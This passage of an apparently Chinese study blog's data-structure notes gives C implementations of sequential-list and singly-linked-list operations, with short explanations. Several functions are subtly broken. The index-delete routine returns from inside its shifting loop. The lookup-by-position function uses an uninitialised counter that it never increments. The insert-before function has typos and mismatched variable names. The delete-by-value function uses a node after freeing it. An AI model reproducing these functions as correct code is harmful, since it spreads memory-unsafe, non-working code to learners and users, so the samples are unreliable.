class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">SeqList <span class="title function_">SetNullList_Seq</span><span class="params">(<span class="type">int</span> m)</span><span class="comment">//创建空顺序表，m为顺序表最大值</span></span><br><span class="line">&#123;</span><br><span class="line">    SeqList slist = (SeqList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> List));<span class="comment">//申请结构体List空间</span></span><br><span class="line">    <span class="keyword">if</span>(slist != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        slist-&gt;elem = (DataType*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(DataType)*m);<span class="comment">//申请顺序表空间，大小为m个DataType空间</span></span><br><span class="line">        <span class="keyword">if</span>(slist-&gt;elem)</span><br><span class="line">        &#123;</span><br><span class="line">            slist-&gt;Max = m;<span class="comment">//顺序表最大值</span></span><br><span class="line">        slist-&gt;n = <span class="number">0</span>;<span class="comment">//顺序表长度赋值为0</span></span><br><span class="line">            <span class="keyword">return</span>(slist);<span class="comment">//返回slist首地址</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="built_in">free</span>(slist);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;out of space!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">IsNullList_seq</span><span class="params">(SeqList slist)</span><span class="comment">//判断顺序表是否为空</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span>(slist-&gt;n == <span class="number">0</span>);<span class="comment">//顺序表长度为0则是空的，如果为空 return(1)，如果不为空 return(0)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="顺序表插入元素"><a href="#顺序表插入元素" class="headerlink" title="顺序表插入元素"></a>顺序表插入元素</h3><ol><li>移动结点</li><li>插入结点</li><li>&#x3D;&#x3D;增加表长&#x3D;&#x3D;</li><li>检查表空间是否已满</li><li>检查插入位置有效性</li><li>&#x3D;&#x3D;从最后一个结点开始向后移动&#x3D;&#x3D;</li><li>平均时间复杂度是 O(n)</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">InsertPre_seq</span><span class="params">(SeqList slist, <span class="type">int</span> p, DataType x)</span><span class="comment">//在表slist的 p 位置之前插入 x，成功返回1，否则返回0</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> q;</span><br><span class="line">    <span class="keyword">if</span>(slist-&gt;n &gt;= slist-&gt;Max)<span class="comment">//检查表空间是否已满</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;overflow&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(p &lt; <span class="number">0</span> || p &gt; slist-&gt;n)<span class="comment">//检查插入位置有效性</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;not exist!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(q = slist-&gt;n - <span class="number">1</span>; q &gt;= p; q--)<span class="comment">//插入位置以及之后的元素后移</span></span><br><span class="line">    &#123;</span><br><span class="line">        slist-&gt;elem[q+<span class="number">1</span>] = slist-&gt;elem[q];</span><br><span class="line">    &#125;</span><br><span class="line">    slist-&gt;elem[p] = x;<span class="comment">//插入 x 元素</span></span><br><span class="line">    slist-&gt;n = slist-&gt;n+<span class="number">1</span>;<span class="comment">//表长+1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="顺序表删除"><a href="#顺序表删除" class="headerlink" title="顺序表删除"></a>顺序表删除</h3><ol><li>移动结点</li><li>&#x3D;&#x3D;减少表长&#x3D;&#x3D;</li><li>检查删除位置有效性</li><li>&#x3D;&#x3D;从删除位置的下一个元素开始移动&#x3D;&#x3D;</li><li>平均时间复杂度是O(n)</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">Delindex_seq</span><span class="params">(SeqList slist,<span class="type">int</span> p)</span><span class="comment">//删除下标为 p 的元素</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> q;</span><br><span class="line">    <span class="keyword">if</span>(p &lt; <span class="number">0</span> || p &gt;= slist-&gt;n)<span class="comment">//检查删除位置有效性</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Not exist\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(q = p; q &lt; slist-&gt;n<span class="number">-1</span>; q++)<span class="comment">//p位置之后的元素向前移动</span></span><br><span class="line">    &#123;</span><br><span class="line">        slist-&gt;elem[q] = slist-&gt;elem[q+<span class="number">1</span>];</span><br><span class="line">        slist-&gt;n = slist-&gt;n<span class="number">-1</span>;<span class="comment">//表长-1</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这里老师出了一个思考题，如何删除顺序表中所有值为 x 的元素</p><p>思路：把不等于 x 的元素提出来重新放到一个新数组里，建立flag变量来记录表长</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">deleteX_seq</span><span class="params">(SeqList slist,<span class="type">int</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;<span class="comment">//循环变量</span></span><br><span class="line">    <span class="type">int</span> flag = <span class="number">0</span>;<span class="comment">//循环变量</span></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; slist-&gt;n; i++)<span class="comment">//遍历顺序表</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(slist-&gt;elem[i] != x)</span><br><span class="line">        &#123;</span><br><span class="line">            slist-&gt;elem[flag] = slist-&gt;elem[i];<span class="comment">//把值不是 x 的元素放到新数组里</span></span><br><span class="line">            flag++;<span class="comment">//用来记录新的表长</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    slist-&gt;n = flag;<span class="comment">//更新新表长</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="顺序表查找定位"><a href="#顺序表查找定位" class="headerlink" title="顺序表查找定位"></a>顺序表查找定位</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">LocateIndex_seq</span><span class="params">(SeqList slist, <span class="type">int</span> x)</span><span class="comment">//遍历顺序表查找值为x的元素，返回其下标</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;<span class="comment">//循环变量</span></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; slist-&gt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(slist-&gt;elem[i] == x)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;<span class="comment">//查找失败返回-1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>已经排好序的顺序表可以采用二分法查找，详见书P28页</p></blockquote><h2 id="单链表"><a href="#单链表" class="headerlink" title="单链表"></a>单链表</h2><ul><li>链表用一组&#x3D;&#x3D;任意的存储单元&#x3D;&#x3D;存储线性表中各元素，通过指针来表示数据元素之间的逻辑关系，数据元素的逻辑关系和物理关系不一样</li><li>&#x3D;&#x3D;单链表的一个重要特性就是只能通过前驱结点找到后续结点，而无法从后续结点找到前驱结点&#x3D;&#x3D;</li></ul><p><img src="https://img-blog.csdn.net/20180926161835379?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhaWR1XzQxODEzMzY4/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><p><img src="https://img-blog.csdn.net/20180825190821499?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21lbmdfbGVtb24=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><table><thead><tr><th align="center">建立</th><th align="center">插入</th><th align="center">删除</th><th align="center">查找</th><th align="center">输出</th></tr></thead><tbody><tr><td align="center">头插法</td><td align="center">前插法</td><td align="center">删除 P 后继</td><td align="center">序号查找</td><td align="center">顺序打印</td></tr><tr><td align="center">尾插法</td><td align="center">后插法</td><td align="center">删除 P 本身</td><td align="center">值查找</td><td align="center"></td></tr><tr><td align="center">递归法</td><td align="center"></td><td align="center">按值删除</td><td align="center"></td><td align="center"></td></tr></tbody></table><h3 id="链表类型定义"><a href="#链表类型定义" class="headerlink" title="链表类型定义"></a>链表类型定义</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> DataType;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    DataType data;<span class="comment">//数据域</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">next</span>;</span><span class="comment">//指针域</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">PNode</span>;</span><span class="comment">//结点类型重命名</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">LinkList</span>;</span><span class="comment">//单链表类型重命名，方便区分</span></span><br></pre></td></tr></table></figure><blockquote><p>指针域为什么要定义成 <code>struct Node *</code>类型？</p><p>这个问题想了我二十分钟T_T，原来就是因为指针域的指针要指向下一个结点，下一个结点的数据类型就是<code>struct Node</code>类型，麻了，又是简单的问题想老半天</p></blockquote><h3 id="单链表建立和判空"><a href="#单链表建立和判空" class="headerlink" title="单链表建立和判空"></a>单链表建立和判空</h3><ul><li>建立带有头结点的空的单链表，为了方便后面的算法运算</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">LinkList <span class="title function_">SetNullList_Link</span><span class="params">()</span><span class="comment">//创一个带有哨兵的空链表</span></span><br><span class="line">&#123;</span><br><span class="line">    LinkList head = (LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Node));<span class="comment">//申请头结点空间</span></span><br><span class="line">    <span class="keyword">if</span>(head != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        head-&gt;next =<span class="literal">NULL</span>;<span class="comment">//头结点的指针域赋值为NULL</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Alloc failure&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> head;<span class="comment">//返回头结点的地址</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">IsNull_Link</span><span class="params">(LinkList head)</span><span class="comment">//判空函数，如果为空返回1，不为空返回0</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span>(head-&gt;next == <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="头插法建立非空单链表"><a href="#头插法建立非空单链表" class="headerlink" title="头插法建立非空单链表"></a>头插法建立非空单链表</h4><p><img src="https://raw.githubusercontent.com/C1everF0x/Images/master/20200930005326.png" alt="步骤"></p><blockquote><p><strong>第三步和第四步不能够颠倒顺序，如果先做第四步，那么头结点会和后面的结点断开联系</strong></p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">CreateList_Head</span><span class="params">(<span class="keyword">struct</span> Node *head)</span><span class="comment">//头插法建立非空单链表</span></span><br><span class="line">&#123;</span><br><span class="line">    PNode p = <span class="literal">NULL</span>;<span class="comment">//建立空结点</span></span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入整型数据建立链表，以-1结束\n&quot;</span>);</span><br><span class="line">    scanf_s(<span class="string">&quot;%d&quot;</span>, &amp;data);<span class="comment">//输入数据域内的值</span></span><br><span class="line">    <span class="keyword">while</span>(data != <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        p = (<span class="keyword">struct</span> Node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Node));<span class="comment">//为空结点申请内存</span></span><br><span class="line">        p-&gt;data = data;<span class="comment">//数据域赋值</span></span><br><span class="line">        p-&gt;next = head-&gt;next;<span class="comment">//头结点指针域赋值给插入节点的指针域</span></span><br><span class="line">        head-&gt;next = p;<span class="comment">//新插入结点地址赋值给head-&gt;next</span></span><br><span class="line">        scanf_s(<span class="string">&quot;%d&quot;</span>, &amp;data);<span class="comment">//输入下一个数据结点的数据域</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="尾插法建立单链表"><a href="#尾插法建立单链表" class="headerlink" title="尾插法建立单链表"></a>尾插法建立单链表</h4><p><img src="https://raw.githubusercontent.com/C1everF0x/Images/master/20200930014203.png" alt="步骤"></p><blockquote><p><strong>同样的第四步和第五步不能调换顺序，如果先做第五步，尾指针就会失去和尾结点的联系，就没办法再进行第四步了</strong></p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">CreateList_Tail</span><span class="params">(<span class="keyword">struct</span> Node *head)</span><span class="comment">//尾插法建立非空单链表</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">p</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">q</span> =</span> head;</span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入整型数据建立链表，以-1结束\n&quot;</span>);</span><br><span class="line">    scanf_s(<span class="string">&quot;%d&quot;</span>, &amp;data);</span><br><span class="line">    <span class="keyword">while</span>(data != <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        p = (<span class="keyword">struct</span> Node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Node));<span class="comment">//为空结点申请内存</span></span><br><span class="line">        p-&gt;data = data;<span class="comment">//新结点数据域赋值</span></span><br><span class="line">        p-&gt;next = <span class="literal">NULL</span>;<span class="comment">//插入结点指针域赋值为NULL</span></span><br><span class="line">        q-&gt;next = p;<span class="comment">//最后一个结点指针域指向新插入结点</span></span><br><span class="line">        q = p;<span class="comment">//最后一个结点地址赋值给尾指针</span></span><br><span class="line">        scanf_s(<span class="string">&quot;%d&quot;</span>, &amp;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="单链表查找"><a href="#单链表查找" class="headerlink" title="单链表查找"></a>单链表查找</h3><h4 id="按值查找"><a href="#按值查找" class="headerlink" title="按值查找"></a>按值查找</h4><p>找数据域值为<code>给定值x</code>的结点，找到的话，返回其第一次出现的<code>存储位置</code>，否则返回<code>NULL</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PNode <span class="title function_">Locate_Link</span><span class="params">(LinkList llist, DataType x)</span><span class="comment">//传进去llist链表，查找值为x的元素</span></span><br><span class="line">&#123;</span><br><span class="line">    PNode p;<span class="comment">//用于遍历链表的指针</span></span><br><span class="line">    <span class="keyword">if</span>(llist == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    p = llist-&gt;next;<span class="comment">//p指针指向第一个有效结点</span></span><br><span class="line">    <span class="keyword">while</span>(p != <span class="literal">NULL</span>&amp;&amp;p-&gt;data != x)<span class="comment">//当 p = NULL时或 p-&gt;data=x时，退出循环，否则指针指向下一个结点</span></span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="按照序号查找"><a href="#按照序号查找" class="headerlink" title="按照序号查找"></a>按照序号查找</h4><p>找链表中第<code>i</code>个结点，找到的话，返回该结点的<code>存储位置</code>，否则返回<code>NULL</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">PNode <span class="title function_">Locate_Link2</span><span class="params">(Linklist llist,<span class="type">int</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">    PNode p;</span><br><span class="line">    <span class="type">int</span> flag;</span><br><span class="line">    <span class="keyword">if</span>(llist == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    p = llist-&gt;next;</span><br><span class="line">    <span class="keyword">while</span>(p!=<span class="literal">NULL</span>&amp;&amp;flag!=x)</span><br><span class="line">    &#123;</span><br><span class="line">        p=p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="单链表插入"><a href="#单链表插入" class="headerlink" title="单链表插入"></a>单链表插入</h3><h4 id="后插法"><a href="#后插法" class="headerlink" title="后插法"></a>后插法</h4><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201209192825.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在链表llist中的p位置之后插入值为x的结点</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">InsertPost_link</span><span class="params">(LinkList llist,PNode p,DataType x)</span></span><br><span class="line">&#123;</span><br><span class="line">    PNode q;</span><br><span class="line">    <span class="keyword">if</span>(p == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;data don&#x27;t exist&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    q = (PNode)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Node));</span><br><span class="line">    <span class="keyword">if</span>(q != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        q-&gt;data = x;</span><br><span class="line">        q-&gt;next = p-&gt;next;</span><br><span class="line">        p-&gt;next = q;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;malloc 失败\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="前插法"><a href="#前插法" class="headerlink" title="前插法"></a>前插法</h4><blockquote><p><strong>前插法首先要找到p的前驱结点pre，然后转化为后插法来插入</strong></p></blockquote><p><img src="https://raw.githubusercontent.com/C1everF0x/Images/master/20200930100744.png" alt="步骤"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">InsertPre_link</span><span class="params">(LinkList llist.PNode p,DataType x)</span></span><br><span class="line">&#123;</span><br><span class="line">    Pnode prt = llist;</span><br><span class="line">    PNode q = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">while</span>(pre-&gt;next != p)</span><br><span class="line">    &#123;</span><br><span class="line">        pre = pre-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    q = (PNode)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Node));</span><br><span class="line">    <span class="keyword">if</span>(q ==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    q-&gt;data = x;</span><br><span class="line">    q-&gt;next = p;</span><br><span class="line">    pre-&gt;next = q;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="单链表删除"><a href="#单链表删除" class="headerlink" title="单链表删除"></a>单链表删除</h3><h4 id="删除结点的后继"><a href="#删除结点的后继" class="headerlink" title="删除结点的后继"></a>删除结点的后继</h4><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201209193833.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">DelPostionNext_Link</span><span class="params">(LinkList head,PNode r)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(r-&gt;next)</span><br><span class="line">    &#123;</span><br><span class="line">        PNode p = r-&gt;next;</span><br><span class="line">    r-&gt;next = p-&gt;next;</span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="删除结点本身"><a href="#删除结点本身" class="headerlink" title="删除结点本身"></a>删除结点本身</h4><blockquote><p>删除结点本身需要先找到结点的前驱，然后转化为删除结点的后继来做</p></blockquote><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201209193938.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">DelPostion_Link</span><span class="params">(LinkList head,PNode r)</span></span><br><span class="line">&#123;</span><br><span class="line">PNode  pre = head; </span><br><span class="line"><span class="keyword">while</span>(pre-&gt;next != r)</span><br><span class="line">    &#123;</span><br><span class="line">        pre = pre-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    pre-&gt;next = r-&gt;next;</span><br><span class="line">    <span class="built_in">free</span>(r);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="按值删除"><a href="#按值删除" class="headerlink" title="按值删除"></a>按值删除</h4><blockquote><p>按值删除的原理就是用两个指针一前一后遍历链表，后面的指针找到要删除结点之后把指针域赋值给前一个指针的指针域，然后自我释放，原理等同于删除自身结点的算法</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//删除第一个与输入参数data相等的值的结点</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">DelValue_Link</span><span class="params">(LinkList head,<span class="type">int</span> data)</span></span><br><span class="line">&#123;</span><br><span class="line">    PNode p = head-&gt;next;</span><br><span class="line">    PNode before_p = head;</span><br><span class="line">    <span class="keyword">while</span>(p != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(p-&gt;data == data)</span><br><span class="line">        &#123;</span><br><span class="line">            before_p-&gt;next = p-&gt;next;</span><br><span class="line">            <span class="built_in">free</span>(p);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            p = p-&gt;next;</span><br><span class="line">            before_p = before_p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="单链表逆置"><a href="#单链表逆置" class="headerlink" 